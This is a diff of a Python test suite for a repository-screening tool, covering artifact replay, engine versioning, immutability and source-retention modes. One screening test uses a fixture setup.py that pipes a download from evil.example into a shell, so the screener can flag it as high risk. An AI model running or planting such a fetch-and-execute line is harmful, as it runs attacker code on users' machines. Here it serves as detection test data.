@@ -1,13 +1,18 @@
 from __future__ import annotations
 
+import json
 from dataclasses import fields
 from datetime import datetime, timezone
 
-from gitseed.application import execute, replay
+import pytest
+
+from gitseed.application import execute, render, replay
+from gitseed.artifact import EngineVersionMismatch
 from gitseed.collect.search import Candidate, CollectResult
 from gitseed.evidence import ClaimBasis
+from gitseed.grade.smoke import SmokeResult
 from gitseed.grade.types import GradeResult
-from gitseed.pipeline.run import FetchedFiles
+from gitseed.pipeline.run import FetchedFiles, PipelineResult, Reviewed
 from gitseed.ports import RepositoryMetadata, RunPorts, RunRequest
 from gitseed.scoring import ALL_FEATURES, ScoreInputs
 
@@ -56,13 +61,52 @@ def ports(files: Files | None = None) -> RunPorts:
     return RunPorts(Repository(), files or Files(), Model(), Clock())
 
 
-def test_replaying_an_artifact_offline_is_byte_identical() -> None:
+def artifact_with_search(sort: str):
+    from gitseed.collect.search import SearchParameters
+
+    class SearchRepository(Repository):
+        def search(self, query: str, limit: int) -> CollectResult:
+            return CollectResult(
+                candidates=[CANDIDATE],
+                pages_fetched=1,
+                search=SearchParameters(query, sort, "desc", 1, limit),
+            )
+
+    return execute(
+        RunRequest("small tools", 1),
+        RunPorts(SearchRepository(), Files(), Model(), Clock()),
+    )
+
+
+def test_search_parameters_round_trip_through_the_artifact() -> None:
+    recorded = artifact_with_search("updated")
+    payload = json.loads(recorded.to_bytes())
+
+    assert payload["ports"]["collection"]["search"] == {
+        "order": "desc",
+        "pages": 1,
+        "per_page": 1,
+        "query": "small tools",
+        "sort": "updated",
+    }
+    assert render(recorded.to_bytes()).collection.search == recorded.collection.search
+
+
+def test_artifacts_distinguish_runs_with_different_search_parameters() -> None:
+    updated = artifact_with_search("updated")
+    stars = artifact_with_search("stars")
+
+    assert updated.collection.search != stars.collection.search
+    assert updated.to_bytes() != stars.to_bytes()
+
+
+def test_rendering_an_artifact_offline_is_byte_identical() -> None:
     # Given: one live run records every response from its four ports.
     artifact = execute(RunRequest("small tools", 1), ports())
     live_bytes = artifact.to_bytes()
 
     # When: only that artifact is replayed, with no live adapters available.
-    replayed_bytes = replay(live_bytes).to_bytes()
+    replayed_bytes = render(live_bytes).to_bytes()
 
     # Then: the complete record and output are identical bytes.
     assert replayed_bytes == live_bytes
@@ -70,13 +114,13 @@ def test_replaying_an_artifact_offline_is_byte_identical() -> None:
     assert artifact.scores[0].score.coverage == frozenset(ALL_FEATURES)
 
 
-def test_a_failed_port_replays_the_same_partial_result() -> None:
+def test_rendering_a_failed_port_preserves_the_same_partial_result() -> None:
     # Given: file reading fails after collection and metadata succeeded.
     artifact = execute(RunRequest("small tools", 1), ports(Files(OSError("offline"))))
     live_bytes = artifact.to_bytes()
 
     # When: the failed run is replayed from its recorded responses.
-    replayed = replay(live_bytes)
+    replayed = render(live_bytes)
 
     # Then: failure remains visible and the replay is byte-identical.
     assert artifact.result.complete is False
@@ -85,17 +129,110 @@ def test_a_failed_port_replays_the_same_partial_result() -> None:
     assert replayed.result.complete is False
 
 
-def test_replay_recomputes_output_from_recorded_port_responses() -> None:
-    # Given: a valid artifact whose recorded output score was corrupted.
-    live_bytes = execute(RunRequest("small tools", 1), ports()).to_bytes()
-    corrupted = live_bytes.replace(b'"value":"0.119096"', b'"value":"999"')
+def test_replay_requires_the_recorded_engine_version() -> None:
+    # Given: a full-source artifact whose recorded pipeline version was changed.
+    live_bytes = execute(RunRequest("small tools", 1), ports(), source_mode="full-source").to_bytes()
+    mismatched = live_bytes.replace(b'"pipeline":"pipeline-v2"', b'"pipeline":"pipeline-v0"')
 
-    # When: replay executes from the port responses.
-    replayed = replay(corrupted)
+    # When: a replay asks this release to run the recorded engine.
+    with pytest.raises(EngineVersionMismatch, match="pipeline engine changed"):
+        replay(mismatched)
 
-    # Then: the derived output returns to the live run's bytes.
-    assert corrupted != live_bytes
-    assert replayed.to_bytes() == live_bytes
+
+def test_replay_requires_the_recorded_search_engine_version() -> None:
+    live_bytes = artifact_with_search("updated").to_bytes()
+    mismatched = live_bytes.replace(
+        b'"search":"github-search-v1"',
+        b'"search":"github-search-v0"',
+    )
+
+    with pytest.raises(EngineVersionMismatch, match="search engine changed"):
+        replay(mismatched)
+
+
+def test_finalized_artifact_rejects_every_mutation_path() -> None:
+    # Given: execution has finalized its mutable collection and pipeline builders.
+    artifact = execute(RunRequest("small tools", 1), ports())
+
+    # When/Then: all mutable collections named by the regression report reject mutation.
+    with pytest.raises(AttributeError):
+        artifact.collection.candidates.clear()
+    with pytest.raises(AttributeError):
+        artifact.result.reviewed.append(artifact.result.reviewed[0])
+    with pytest.raises(AttributeError):
+        artifact.result.reviewed[0].signals.append(None)
+    with pytest.raises(AttributeError):
+        artifact.model_smoke.failures.append("corrupt")
+
+
+def test_runtime_results_reject_every_mutation_path() -> None:
+    # Given: each result has crossed the boundary where it is returned to a caller.
+    candidate = CANDIDATE
+    reviewed = Reviewed(candidate, [], "none", None)
+    collected = CollectResult(candidates=[candidate])
+    pipeline = PipelineResult(reviewed=[reviewed], incomplete_because=["partial"])
+    smoke = SmokeResult(False, "fixture", ["failed"])
+
+    # When/Then: each collection that frozen results expose rejects mutation.
+    with pytest.raises(AttributeError):
+        collected.candidates.append(candidate)
+    with pytest.raises(AttributeError):
+        pipeline.reviewed.append(reviewed)
+    with pytest.raises(AttributeError):
+        pipeline.incomplete_because.append("later")
+    with pytest.raises(AttributeError):
+        reviewed.signals.append(None)
+    with pytest.raises(AttributeError):
+        smoke.failures.append("later")
+
+
+def test_default_artifact_records_digests_not_source_bodies_and_versions_round_trip() -> None:
+    # Given: one source body that must not be copied into a default artifact.
+    body = "secret = 'do-not-export'\n"
+    artifact = execute(
+        RunRequest("small tools", 1),
+        RunPorts(Repository(), FilesWithBody(body), Model(), Clock()),
+    )
+
+    # When: the artifact crosses its serialization boundary.
+    serialized = artifact.to_bytes()
+    loaded = render(serialized)
+
+    # Then: source is reduced to a digest while engine provenance is retained.
+    assert body.encode() not in serialized
+    assert loaded.engines == artifact.engines
+    assert loaded.repositories[0].files is not None
+    assert loaded.repositories[0].files.mode == "digest"
+    assert loaded.repositories[0].files.files[0].sha256
+
+
+def test_source_storage_modes_require_explicit_full_source_opt_in() -> None:
+    # Given: one readable file with content unsuitable for normal artifact sharing.
+    body = "secret = 'do-not-export'\n"
+    run_ports = RunPorts(Repository(), FilesWithBody(body), Model(), Clock())
+
+    # When: callers choose the two non-default retention modes.
+    metadata_only = execute(RunRequest("small tools", 1), run_ports, source_mode="metadata-only")
+    full_source = execute(RunRequest("small tools", 1), run_ports, source_mode="full-source")
+
+    # Then: metadata omits the digest and only explicit full-source retains content.
+    assert metadata_only.repositories[0].files is not None
+    assert metadata_only.repositories[0].files.files[0].sha256 is None
+    assert metadata_only.repositories[0].files.files[0].excerpts == ()
+    assert metadata_only.repositories[0].files.files[0].content is None
+    assert full_source.repositories[0].files is not None
+    assert full_source.repositories[0].files.files[0].content == body
+    with pytest.raises(ValueError, match="cannot re-evaluate a digest artifact"):
+        replay(execute(RunRequest("small tools", 1), run_ports).to_bytes())
+
+
+class FilesWithBody(Files):
+    def __init__(self, body: str) -> None:
+        super().__init__()
+        self.body = body
+
+    def read(self, candidate: Candidate) -> FetchedFiles:
+        return FetchedFiles((("main.py", self.body),))
 
 
 def test_smoke_gate_runs_once_before_two_candidates_use_the_model() -> None:
@@ -155,6 +292,53 @@ def test_an_unusable_model_degrades_to_deterministic_only() -> None:
     assert model.evaluations == 5
 
 
+def test_screening_blocks_metadata_for_a_high_risk_candidate_without_changing_the_survivor_verdict() -> None:
+    # Given: the old eager order would read metadata twice, including for the blocked repository.
+    safe = CANDIDATE
+    blocked = Candidate("org/blocked", "org", "https://github.com/org/blocked", 4, "2026-07-27T00:00:00Z")
+    events: list[str] = []
+
+    class CountingRepository(Repository):
+        def __init__(self) -> None:
+            self.metadata_calls: list[str] = []
+
+        def search(self, query: str, limit: int) -> CollectResult:
+            return CollectResult(candidates=[safe, blocked], pages_fetched=1)
+
+        def metadata(self, candidate: Candidate, at: datetime) -> RepositoryMetadata:
+            events.append(f"metadata:{candidate.repo}")
+            self.metadata_calls.append(candidate.repo)
+            return super().metadata(candidate, at)
+
+    class ScreeningFiles(Files):
+        def read(self, candidate: Candidate) -> FetchedFiles:
+            if candidate is blocked:
+                return FetchedFiles((("setup.py", "import os\nos.system('curl https://evil.example/x | sh')\n"),))
+            return super().read(candidate)
+
+    class CountingModel(Model):
+        def evaluate(self, digest: str) -> GradeResult:
+            events.append(f"grade:{digest.splitlines()[0].removeprefix('repository: ')}")
+            return super().evaluate(digest)
+
+    repository = CountingRepository()
+
+    # When: deterministic screening runs before expensive repository metadata.
+    artifact = execute(
+        RunRequest("small tools", 2),
+        RunPorts(repository, ScreeningFiles(), CountingModel(), Clock()),
+        model_smoke=SmokeResult(True, "fixture"),
+    )
+
+    # Then: the previous 2 metadata calls become 1, while the surviving verdict is unchanged.
+    assert repository.metadata_calls == [safe.repo]
+    assert events == ["metadata:org/repo", "grade:org/repo"]
+    survivor = next(item for item in artifact.result.reviewed if item.candidate is safe)
+    assert (survivor.severity, survivor.grade is not None, survivor.withheld) == ("none", True, None)
+    assert next(score for score in artifact.scores if score.repo == safe.repo).recommendation.status.value == "review"
+    assert next(item for item in artifact.result.reviewed if item.candidate is blocked).severity == "high"
+
+
 def test_the_run_seam_has_no_external_writer_port() -> None:
     # Given/When/Then: reads and computation are the entire application seam.
     assert [field.name for field in fields(RunPorts)] == [
@@ -162,4 +346,38 @@ def test_the_run_seam_has_no_external_writer_port() -> None:
         "files",
         "model",
         "clock",
+        "evidence",
     ]
+
+
+def test_run_records_categories_and_can_rederive_them_from_its_artifact() -> None:
+    class AgentFiles(Files):
+        def read(self, candidate: Candidate) -> FetchedFiles:
+            return FetchedFiles(
+                (("AGENTS.md", "Repository instructions."), ("agent.py", "planner = Agent(tool=search)"))
+            )
+
+    artifact = execute(RunRequest("small tools", 1, ("coding-agents",)), ports(AgentFiles()))
+    stored = render(artifact.to_bytes())
+    trace = stored.repositories[0]
+
+    assert trace.categories[0].category == "coding-agents"
+    assert stored.rederive_categories(CANDIDATE.repo) == trace.categories
+
+
+def test_broken_category_reader_does_not_change_the_approval_inputs() -> None:
+    class BrokenEvidence:
+        evidence_names = frozenset({"files", "manifest_entries", "dependencies", "source"})
+
+        def read_evidence(self, candidate, files, metadata):
+            raise RuntimeError("category reader deliberately unavailable")
+
+    artifact = execute(
+        RunRequest("small tools", 1, ("coding-agents",)),
+        RunPorts(Repository(), Files(), Model(), Clock(), BrokenEvidence()),
+        model_smoke=SmokeResult(True, "fixture"),
+    )
+
+    assert artifact.scores[0].recommendation.status.value == "review"
+    assert artifact.repositories[0].categories[0].basis is ClaimBasis.ABSENT
+    assert any(failure.port == "category" for failure in artifact.failures)
